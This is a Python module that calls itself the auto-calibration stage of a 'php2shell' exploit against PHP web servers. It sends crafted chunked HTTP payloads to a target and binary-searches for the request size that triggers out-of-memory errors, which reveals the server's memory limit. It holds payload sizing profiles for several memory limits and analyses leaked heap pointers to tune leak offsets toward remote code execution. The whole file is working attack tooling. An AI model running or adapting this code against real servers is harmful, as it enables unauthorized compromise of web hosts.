"""Auto-calibration module for the php2shell exploit.

Probes the target to automatically determine:
  - Memory limit (by binary-searching for the OOM trigger size)
  - Architecture (from leaked pointer ranges)
  - Optimal leak parameters (MAIN_BUCKET_COUNT, delta range)
  - Payload sizing for different memory_limit values
"""
from __future__ import annotations

import time

from .transport import TransportConfig, send_chunked, send_plain, get_status_code
from .payloads import build_a1_body, build_b1_body, LEAK_SPEC_128M, QUERY_STRING_128M
from .leak import parse_leak, LeakResult


# Payload sizing profiles indexed by memory_limit.
# Each profile has been calibrated for the official Docker image at that limit.
# Fields: (a1_big, a1_parts, a1_fillers128, a1_burners, a2_parts, a2_fillers,
#          fake_len, ht_offset)
SIZING_PROFILES = {
    "8M": {
        "a1_big": 0, "a1_parts": 200, "a1_fillers128": 4, "a1_burners": 5,
        "a2_parts": 200, "a2_fillers": 30,
        "fake_len": 0x8000, "ht_offset": 0x1E398,
    },
    "128M": {
        "a1_big": 78, "a1_parts": 860, "a1_fillers128": 14, "a1_burners": 20,
        "a2_parts": 880, "a2_fillers": 115,
        "fake_len": 0xC8000, "ht_offset": 0xF8398,
    },
    "256M": {
        "a1_big": 160, "a1_parts": 1700, "a1_fillers128": 28, "a1_burners": 40,
        "a2_parts": 1760, "a2_fillers": 230,
        "fake_len": 0xC8000, "ht_offset": 0xF8398,
    },
    "512M": {
        "a1_big": 320, "a1_parts": 3400, "a1_fillers128": 56, "a1_burners": 80,
        "a2_parts": 3520, "a2_fillers": 460,
        "fake_len": 0xC8000, "ht_offset": 0xF8398,
    },
}


def detect_architecture(result: LeakResult) -> str:
    """Determine target architecture from leaked pointer distribution.

    x86_64 processes use 0x7f... for shared library mappings.
    aarch64 processes use 0xffff... (high range) and 0xaaaa... (low range).
    """
    return result.arch


def binary_search_oom(cfg: TransportConfig, path: str = "/index.php",
                      min_big: int = 10, max_big: int = 400,
                      verbose: bool = True) -> int | None:
    """Find the exact --big value that triggers OOM for the target's memory_limit.

    Sends A1-style payloads with increasing --big values. When the response
    switches from 200 to 500, we've found the OOM threshold.

    Returns the --big value that triggers OOM, or None if not found.
    """
    # First check that the target responds at all
    from .transport import send_get
    resp = send_get(cfg, path)
    if get_status_code(resp) == 0:
        if verbose:
            print("  [!] target unreachable")
        return None

    # Binary search for OOM threshold
    lo, hi = min_big, max_big
    last_oom = None

    while lo <= hi:
        mid = (lo + hi) // 2
        if verbose:
            print(f"  [probe] big={mid}", end=" ", flush=True)

        body = build_a1_body(big=mid)
        resp = send_chunked(cfg, path + QUERY_STRING_128M, body)
        code = get_status_code(resp)

        if verbose:
            print(f"-> HTTP {code}")

        if code == 500:
            last_oom = mid
            hi = mid - 1
        elif code in (200, 0):
            lo = mid + 1
        else:
            lo = mid + 1

        time.sleep(0.3)

    return last_oom


def detect_memory_limit(oom_big: int) -> str:
    """Estimate memory_limit from the OOM trigger --big value.

    The relationship between --big and memory_limit is roughly linear:
    each --big unit is ~8KB, plus fixed overhead from parts/fillers/burners.
    """
    if oom_big is None:
        return "unknown"

    # Approximate mapping based on calibration data
    if oom_big <= 5:
        return "8M"
    elif oom_big <= 90:
        return "128M"
    elif oom_big <= 180:
        return "256M"
    elif oom_big <= 360:
        return "512M"
    else:
        return f">{512 * (oom_big // 360)}M"


def get_sizing_profile(memory_limit: str) -> dict:
    """Get the calibrated payload sizing profile for a memory limit."""
    if memory_limit in SIZING_PROFILES:
        return SIZING_PROFILES[memory_limit]
    # Default to 128M profile
    return SIZING_PROFILES["128M"]


def calibrate_leak_params(result: LeakResult) -> dict:
    """After a successful leak, analyze pointer distribution to tune parameters.

    Returns adjusted values for MAIN_BUCKET_COUNT and delta range based on
    the actual leak data rather than hardcoded assumptions.
    """
    if not result.buckets:
        return {
            "main_bucket_count": 87,
            "delta_min": 0x100000,
            "delta_max": 0xC000000,
        }

    # Find the actual main chunk pointer count
    lib_bucket = result.zval_ptr_dtor_addr & ~0x1FFFFF
    sorted_buckets = sorted(result.buckets.items(), key=lambda x: -x[1])

    # Remove libphp bucket and dominant (id) bucket
    id_bucket = sorted_buckets[0][0] if sorted_buckets else 0
    filtered = [(b, c) for b, c in sorted_buckets
                if b not in (lib_bucket, id_bucket)]

    if not filtered:
        return {
            "main_bucket_count": 87,
            "delta_min": 0x100000,
            "delta_max": 0xC000000,
        }

    # The main chunk is typically the 3rd-largest bucket
    main_count = filtered[0][1] if filtered else 87
    main_base = filtered[0][0] if filtered else 0

    # Calculate actual delta
    if main_base:
        delta = abs(result.libphp_base - main_base)
        margin = max(delta // 4, 0x200000)
        delta_min = max(0x100000, delta - margin)
        delta_max = delta + margin
    else:
        delta_min, delta_max = 0x100000, 0xC000000

    return {
        "main_bucket_count": main_count,
        "delta_min": delta_min,
        "delta_max": delta_max,
    }
